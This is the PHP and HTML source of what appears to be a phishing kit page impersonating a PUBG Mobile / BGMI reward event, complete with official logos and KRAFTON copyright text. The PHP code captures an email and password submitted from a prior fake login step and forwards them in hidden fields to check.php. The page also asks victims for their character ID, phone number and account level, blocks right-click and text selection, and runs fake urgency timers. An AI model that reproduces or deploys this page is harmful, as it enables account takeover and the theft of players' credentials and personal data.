<?php
// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == "" && $login == ""){
header("Location: index.php");
}
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="PUBG MOBILE : KOENIGSEGG EVENT">
<meta name="description" content="Collect your special rewards at the PUBG MOBILE : KOENIGSEGG EVENT. This opportunity is limited and without the need for topup. Collect your rewards now!">
<meta property="og:description" content="Collect your special rewards at the PUBG MOBILE : KOENIGSEGG EVENT. This opportunity is limited and without the need for topup. Collect your rewards now!">
<meta property="og:url" content="./">
<meta property="og:site_name" content="PUBG MOBILE : KOENIGSEGG EVENT">
<meta property="og:type" content="website"PUBG MOBILE : KOENIGSEGG EVENT>
<meta name="copyright"content="PUBG MOBILE">
<meta name="theme-color" content="#000">
<meta property="og:image" content="https://www.pubgmobile.com/common/images/icon_logo.jpg">
<title>PUBG MOBILE : KOENIGSEGG EVENT</title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/log/tanfc.css">
<link rel="stylesheet" href="css/log/tantw.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="https://www.pubgmobile.com/common/images/icon_logo.jpg">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
<style type="text/css">
	@charset "utf-8";
@import url("https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Teko:300,400,500");
*,*:before,*:after {
	-webkit-box-sizing:border-box;
	-moz-box-sizing:border-box;
	box-sizing:border-box;
}
@font-face {
    font-family: 'pubgFont'; 
    font-style: normal;
    font-weight: 700;
    src: url(fonts/pubg.woff2) format("woff2"), 
        url(fonts/pubg.woff) format("woff"),
        url(fonts/pubg.ttf) format("truetype");
}
body {
	background:#000;
	background-size: 100% 100%;
	margin: 0;
	font-family: 'Teko';
}
.container {
	background: url('https://www.pubgmobile.com/images/event/royalepassm6/m_bg_1.jpg') no-repeat center center;
	background-size: 100% 100%;
	position: relative;
	margin: 0px auto;
	max-width: 400px;
	height: auto;
	border: 1px solid #000;
}
.cont{
    color: #000;
    max-width:350px;
    margin-left: auto;
    margin-right: auto;
    margin-top: -10px;
    padding-top: -10px;
}
.navbar {
	background:#000;
	width:100%;
	height:50px;
	padding:4px;
	border-bottom:1px solid #4dcafd;
}
.navbar img {
	width:41;
	margin-right:5px;
	border-radius:5px;
	float:left;
}
.navbar-txt-game {
	padding-top:2px;
	color:#feab02;
	font-size:18px;
	font-family:'Teko',sans-serif;
	text-align:left;
}
.navbar-txt-game span {
	color:#d9d9d8;
	font-size:13px;
	line-height:10px;
	display:block;
}
.navbar-btn-wrapper {
	margin-top:5px;
	float:right;
}
.navbar-btn-wrapper i {
	margin-left:5px;
	font-size:38px;
	color:#d9d9d8;
	line-height:31px;
	float:right;
}
.navbar-btn {
	background:#eaa300;
	width:70px;
	height:auto;
	margin:2px;
	padding:2px;
	color:#000;
	font-size:15px;
	font-family:'Teko',sans-serif;
	text-align:center;
	text-transform:uppercase;
	border:1px solid #ffcc57;
	display:inline-block;
	outline:none;
}
.slideshow-container {
  max-width: 1000px;
  position: relative;
  margin: auto;
  border-top: 1px solid #03C5E5;
  border-bottom: 1px solid #03C5E5;
}
.fade {
  -webkit-animation-name: fade;
  -webkit-animation-duration: 1.5s;
  animation-name: fade;
  animation-duration: 1.5s;
}

@-webkit-keyframes fade {
  from {opacity: .4} 
  to {opacity: 1}
}

@keyframes fade {
  from {opacity: .4} 
  to {opacity: 1}
}

/* On smaller screens, decrease text size */
@media only screen and (max-width: 300px) {
  .text {font-size: 11px}
}
.header {
    width: 100%;
    height: auto;
	margin-left: auto;
	margin-right: auto;
	display: block;
}
.header video {
	width: 100%;
}
.landing {
	width:100%;
	height:auto;
}
.event-wrapper {
	width: 100%;
	margin-bottom:100%;
	padding: 10px;
}
.event-wrapper img:nth-child(1) {
	width: 130px;
	float: right;
}
.event-notify {
	background-color:rgba(0, 0, 0, 0.8);
	width:100%;
	height:auto;
	margin-top:20px;
	margin-left:auto;
	margin-right:auto;
	padding: 8px;
	display:block;
}
.event-notify-title {
	padding-bottom:10px;
	color:#fff;
	font-size:17px;
	font-family:pubgFont;
	text-align:left;
	text-decoration:underline;
}
.event-notify-content {
	color:#fff;
	font-size:16px;
	font-family:pubgFont;
	text-align:left;
	line-height:18px;
}
.event-btn {
	background:transparent;
	width:auto;
	height:auto;
	margin-top:20px;
	margin-left:auto;
	margin-right:auto;
	margin-bottom:15px;
	padding:7px;
	padding-left:15px;
	padding-right:15px;
	color:#eaa300;
	font-size:17px;
	font-family:pubgFont;
	text-align:center;
	border:1px solid #eaa300;
	outline:none;
	display:block;
}
 .about {
color: #feab02;
font-size: 25px;
font-family: pubgFont;
text-align: center;
}
 .about-desc {
padding: 10px;
color: #7C7C7C;
font-size: 15px;
font-family:pubgFont;
text-align: left;
}
.box {
    width: 95%;
    height: auto;
	margin-top: 12px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 12px;
	position: relative;
	border-radius: 5px;
	display: block;
}
.event-alert {
	background:url(img/popup1.png) no-repeat center center;
	background-size:100% 100%;
	width:100%;
	height: 55px;
	margin-left:auto;
	margin-right:auto;
	padding:5px;
	display:block;
	border-radius: 4px;
}
.event-alert span{
	position: absolute;
	top: 5.5%;
	right: 7%;
	width: auto;
	color:white;
}
.event-alert-title {
	color: #fff;
	text-shadow: 0 0 0.15rem rgba(144,180,236,0.74),0 0 0.15rem rgba(144,180,236,0.74);
	font-size: 17px;
	font-family: pubgFont;
	text-align: center;
}
.event-alert-desc {
	color: #fff;
	text-shadow: 0 0 0.15rem rgba(144,180,236,0.74),0 0 0.15rem rgba(144,180,236,0.74);
	font-size: 16px;
	font-family: pubgFont;
	text-align: center;
	line-height: 15px;
}
.menu-wrapper-border {
	height: 11px;
}
.menu-wrapper {
	width: 40%;
	height: auto;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 5px;
	display: block;
}
.menu-content {
	background: #dfedf975;
	background-size: 100% 100%;
	box-shadow: rgba(144,239,6,1);
	width: auto;
	margin-top: -5px;
	height: auto;
	padding: 7px;
	color: white;
	font-size: 14px;
	font-family:pubgFont;
	text-align: center;
	border-top: 0.5px solid #BBDEFB;
	border-bottom: 0.5px solid #BBDEFB;
	border-right: 2px solid #BBDEFB;
	border-left: 2px solid #BBDEFB;
	border-radius: 2px;
	cursor: pointer;
}
.menu-content-active {
	background:url(img/menu_off.png) no-repeat center center;
	background-size:100% 100%;
	color: #fff;
}
.season-img {
	background:url('img/alert.png') no-repeat center center;
	background-size: 100% 100%;
	width: 100%;
	height: 70px;
	margin-top: -15px;
	margin-left: auto;
	margin-right: auto;
	display: block;
}
.season-alert {
	background:url('img/alert2.png') no-repeat center center;
	box-shadow: #fffafa;
	background-size: 100% 100%;
	width:94.3%;
	height: auto;
	margin-left:auto;
	margin-right:auto;
	padding-top:5px;
	padding-bottom:5px;
	display:block;
}
.season-alert-title {
	color: #d9f0ff;
	font-size: 18px;
	font-family: pubgFont;
	font-weight: 500;
	text-align: center;
}
.scroll {
	position:relative;
	width: 100%;
	height:390px;
	margin-top:11px;
	margin-left: auto;
	margin-right: auto;
	display: block;
	scrollbar-face-color:#ffbb40;
	scrollbar-shadow-color:#ffbb40;
	scrollbar-highlight-color:#ffbb40;
	scrollbar-3dlight-color:#ffbb40;
	scrollbar-darkshadow-color:#ffbb40;
	scrollbar-track-color:#ffbb40;
	scrollbar-arrow-color:#ffbb40;
}
.footer {
	background:#000;
	width: 100%;
	height: auto;
	padding: 10px;
}
.footer-txt-follow {
	margin-top: 13px;
	margin-bottom: 5px;
	color: #7C7C7C;
	font-size: 14px;
	font-family:followFont;
	font-weight: bold;
	text-align: center;
	text-transform: uppercase;
}
.footer-follow-icon {
	width: 49px;
	height: 49px;
	margin: 5px;
	display: inline-block;
}
.footer-txt-copyright {
	color: #7C7C7C;
	font-size: 13px;
	font-family:textFont;
	text-align: center;
}
.footer-copyright-icon {
	width: 74%;
	margin-top: 8px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 15px;
	display: block;
}
.verify-input {
	background: #091E2D;
	background-size: 100% 100%;
	box-shadow: rgba(144,239,6,1);
	width: 90%;
	height: auto;
	margin-bottom: 3px;
	padding: 8px;
	color: #fff;
	font-size:17px;
	font-family:pubgFont;
	border-top: 0.5px solid #03C5E5;
	border-bottom: 0.5px solid #03C5E5;
	border-right: 2px solid #03C5E5;
	border-left: 2px solid #03C5E5;
	border-radius: 2px;
	position: relative;
	outline: none;
}
.verify-input::placeholder {
	color: #fff;
}
.verify-select {
	background: #091E2D;
	background-size: 100% 100%;
	box-shadow: rgba(144,239,6,1);
	width: 90%;
	height: auto;
	margin-bottom: 3px;
	padding: 8px;
	padding-left: 3px;
	color: #fff;
	font-size: 17px;
	font-family:pubgFont;
	border-top: 0.5px solid #03C5E5;
	border-bottom: 0.5px solid #03C5E5;
	border-right: 2px solid #03C5E5;
	border-left: 2px solid #03C5E5;
	border-radius: 2px;
	position: relative;
	outline: none;
}
.verify-btn {
    background:url('img/submit.png') no-repeat center;
	background-size: 100% 100%;
	width: 35%;
	height: auto;
	margin-top: 0px;
	padding: 10px;
	font-size: 22px;
	font-family:pubgFont;
	text-align: center;
	color: #fff;
	margin-bottom: 3px;
	border: none;
	position: relative;
	outline: none;
}
.kanan {
	float: right;
}
.kiri {
	float: left;
}
.tengah {
	margin-left: auto;
	margin-right: auto;
	display: block;
}
::-webkit-scrollbar { 
    display: none;
    width: 0px;
}
[class~=tab] span{text-shadow:-1px 1px #000;}
[class~=tab] span{font-size:.125in;}
[class~=tab] span{margin-top:.072916667in;}
[class~=tab]{cursor:pointer;}
.tab {color:silver;}
.tab:hover {color:white;}

[class~=last]{margin-right:0 !important;}
[class~=gallery-container]{float:left;}
[class~=gallery-container]{padding: 0% 0px;}
[class~=gallery-container]{width:100%;}
[class~=gallery-container]{border:none;}
[class~=gallery-container]{background: url('https://www.pubgmobile.com/images/event/royalepassm6/m_bg_1.jpg') no-repeat center;background-size: cover;}
}
.header{
		max-width: 400px;
		height: 210px;
		margin:0px;
	}
	.item div {
    width: 100%;
    height: 100%;
    border-radius: 3px 3px 0px 0px;
	}
	.item div:first-child {
	    margin-left: 0;
	}

	figure {
    margin: 0;
    padding: 0;
    overflow: hidden;
	}
	.seseselow figure {
    position: relative;
	}
	.seseselow figure::before {
	    position: absolute;
	    top: 0;
	    left: -75%;
	    z-index: 2;
	    display: block;
	    content: '';
	    width: 50%;
	    height: 100%;
	    background: -webkit-linear-gradient(left, rgba(255,255,255,0) 0%, rgba(255,255,255,.3) 100%);
	    background: linear-gradient(to right, rgba(255,255,255,0) 0%, rgba(255,255,255,.3) 100%);
	    -webkit-transform: skewX(-25deg);
	    transform: skewX(-25deg);
	}
	.seseselow figure::before {
	    -webkit-animation: shine 2s infinite;
	    animation: shine 2s infinite;
	}
	@-webkit-keyframes shine {
	    100% {
	        left: 125%;
	    }
	}
	@keyframes shine {
	    100% {
	        left: 125%;
	    }
	}
@media only screen and (max-width:600px) {
    .container {
        width: 100%;
        height: auto;
        margin-top: 0px;
        margin-bottom: 0px;
		border: none;
		border-top:1px solid #000;
        border-radius: 0px;
        padding: 0px;
    }

	.box {
	    width: 96%;
		height: auto;
	}
    .scroll {
        height: none;
    }
    .item {
        height: 90px;
    }
    .popup-box {
        width: 345px;
        margin-top: 60%;
    }
    .popup-item {
        width:25%;
        height:85px;
	}
	.popup-box-login-fb {
		margin-top: 4%;
	}
	.popup-box-login-twitter {
		margin-top: 25%;
	}
	.header{
		width: 100%;
		}
}
</style>
<div class="container rewardsBox">
<div class="navbar">
<div class="navbar-btn-wrapper">
<i class="fa fa-bars fa-2x"></i>
<button type="button" class="navbar-btn" onclick="location.href='https://www.pubgmobile.com/pay/';" onmousedown="buka.play();">Purchase</button>
<button type="button" class="navbar-btn" onclick="location.href='https://play.google.com/store/apps/details?id=com.tencent.ig';" onmousedown="buka.play();">Download</button>
</div> <!--- navbar-btn-wrapper --->
<img src="https://www.battlegroundsmobileindia.com/common/img/main/app.png">
<div class="navbar-txt-game">
Battlegrounds India
<span>OFFICIAL PUBG ON MOBILE</span>
</div> <!--- navbar-txt-game --->
</div> <!--- navbar --->
<div class="header">
<video style="width:100%" src="media/header.mp4" autoplay loop muted></video>
</div> <!--- header --->
<br>
<div class="container">
<div class="gallery-container">
<center><br>
<div class="box">
<div class="event-alert">
<div class="event-alert-title">BGMI Event Reward</div>
<div class="event-alert-desc">Please enter details account to receive reward</div>
</div> 

<div class="menu-wrapper-border"></div>
<br>
<br>
<div class="tab_rewards" id="latest">
<center>
<form action="check.php" method="post">
<input type="hidden" name="email" value="<?php echo $email;?>" readonly>
<input type="hidden" name="password" value="<?php echo $password;?>" readonly>
<input type="number" class="verify-input" name="playid" placeholder=" Enter Your CHARACTER ID" autofocus="" autocomplete="off" required="">
<input type="number" class="verify-input" name="phone" placeholder=" Enter Your PHONE NUMBER" autocomplete="off" required>
<select class="verify-input" name="level" id="level" required>
<option selected="selected" disabled="disabled" value="">Choose Your ACCOUNT LEVEL</option>
<option>1</option>
<option>2</option>
<option>3</option>
<option>4</option>
<option>5</option>
<option>6</option>
<option>7</option>
<option>8</option>
<option>9</option>
<option>10</option>
<option>11</option>
<option>12</option>
<option>13</option>
<option>14</option>
<option>15</option>
<option>16</option>
<option>17</option>
<option>18</option>
<option>19</option>
<option>20</option>
<option>21</option>
<option>22</option>
<option>23</option>
<option>24</option>
<option>25</option>
<option>26</option>
<option>27</option>
<option>28</option>
<option>29</option>
<option>30</option>
<option>31</option>
<option>32</option>
<option>33</option>
<option>34</option>
<option>35</option>
<option>36</option>
<option>37</option>
<option>38</option>
<option>39</option>
<option>40</option>
<option>41</option>
<option>42</option>
<option>43</option>
<option>44</option>
<option>45</option>
<option>46</option>
<option>47</option>
<option>48</option>
<option>49</option>
<option>50</option>
<option>51</option>
<option>52</option>
<option>53</option>
<option>54</option>
<option>55</option>
<option>56</option>
<option>57</option>
<option>58</option>
<option>59</option>
<option>60</option>
<option>61</option>
<option>62</option>
<option>63</option>
<option>64</option>
<option>65</option>
<option>66</option>
<option>67</option>
<option>68</option>
<option>69</option>
<option>70</option>
<option>71</option>
<option>72</option>
<option>73</option>
<option>74</option>
<option>75</option>
<option>76</option>
<option>77</option>
<option>78</option>
<option>79</option>
<option>80</option>
<option>81</option>
<option>82</option>
<option>83</option>
<option>84</option>
<option>85</option>
<option>86</option>
<option>87</option>
<option>88</option>
<option>89</option>
<option>90</option>
<option>91</option>
<option>92</option>
<option>93</option>
<option>94</option>
<option>95</option>
<option>96</option>
<option>97</option>
<option>98</option>
<option>99</option>
<option>100</option>
</select>
<input type="hidden" name="login" value="<?php echo $login;?>" readonly>
<br>
<br>
<button type="submit" class="verify-btn" onmousedown="buka.play()">Submit</button>
</form>
</center>
</div> <!--- tab-rewards --->
</div> <!--- box --->
<div class="footer">
<img class="footer-copyright-icon" src="img/footer.png">
<div class="footer-txt-copyright">ⓒ 2021 KRAFTON, Inc. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">ㅤ</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">Privacy Policy | Terms of Service | Rules of Conduct</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">| Official Community Policy</div> <!--- footer-txt-copyright --->
</div> <!--- footer --->
</div> <!--- container --->

<script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/tab.js"></script>
<script>
var slideIndex = 0;
showSlides();
function showSlides() {
  var i;
  var slides = document.getElementsByClassName("mySlides");
  var dots = document.getElementsByClassName("dot");
  for (i = 0; i < slides.length; i++) {
    slides[i].style.display = "none";  
  }
  slideIndex++;
  if (slideIndex > slides.length) {slideIndex = 1}    
  for (i = 0; i < dots.length; i++) {
    dots[i].className = dots[i].className.replace(" active", "");
  }
  slides[slideIndex-1].style.display = "block";  
  dots[slideIndex-1].className += " active";
  setTimeout(showSlides, 4000);
}
</script>
<script>
function open_reward_confirmation(ag) {
    var rewardImg = $(ag).attr("src");
    $('.reward_confirmation').show();
    $('#myRewardImg').attr('src',rewardImg);
}
function open_account_login(){
	$('.account_login').show();
	$('.reward_confirmation').hide();
}
function open_facebook(){
	$('.login-facebook').show();
	$('.account_login').hide();
}
function open_twitter(){
	$('.login-twitter').show();
	$('.account_login').hide();
}

// tombol untuk menutup popup
function close_reward_confirmation(){
	$('.reward_confirmation').hide()
}
function close_account_login(){
	$('.account_login').hide()
}
function tutup_facebook(){
	$('.login-facebook').hide()
	$('.account_login').show();
}
function tutup_twitter(){
	$('.login-twitter').hide()
	$('.account_login').show();
}

</script>
<script src="js/click.js"></script>
<script type="text/javascript">
	$(document).ready(function() { 
var detik = 59;
var menit = 59;
var jam = 23;
function hitung() { 
setTimeout(hitung,1000); $('#latestTimer').html( '' + jam + ' : ' + menit + ' : ' + detik + ''); detik --; 
if(detik < 0) { 
detik = 59; 
menit --; 
if(menit < 0) { 
menit = 0; 
detik = 0; 
} 
} 
} 
hitung(); 
}
);

$(document).ready(function() { 
var detik = 59;
var menit = 59;
var jam = 23;
function hitung() { 
setTimeout(hitung,1000); $('#seasonTimer').html( '' + jam + ' : ' + menit + ' : ' + detik + ''); detik --; 
if(detik < 0) { 
detik = 59; 
menit --; 
if(menit < 0) { 
menit = 0; 
detik = 0; 
} 
} 
} 
hitung(); 
}
);
</script>
</body>
</html>